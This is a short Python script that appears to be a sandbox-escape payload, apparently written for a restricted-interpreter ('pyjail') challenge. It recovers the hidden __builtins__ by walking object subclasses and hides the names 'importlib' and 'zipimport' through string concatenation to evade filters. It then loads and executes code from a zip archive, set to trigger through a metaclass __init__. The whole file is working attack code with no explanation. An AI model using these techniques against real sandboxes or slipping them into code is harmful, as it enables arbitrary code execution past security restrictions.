import sys
import os

__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
check=__builtins__["__import__"]("impo"+"rtli"+"b.u"+"til")
check2=__builtins__["__import__"]("zipim"+"port")

def test(is_unix,is_mac,is_windows,is_all):
    module_name = "zip"
    zip_importer = check2.zipimporter(str("zip.zip"))
    spec = check.util.spec_from_loader(module_name, zip_importer)
    module = check.util.module_from_spec(spec)
    zip_importer.exec_module(module)
    sys.modules[module_name] = module
    module.hello()

class Metaclass(type):
    __init__ = test 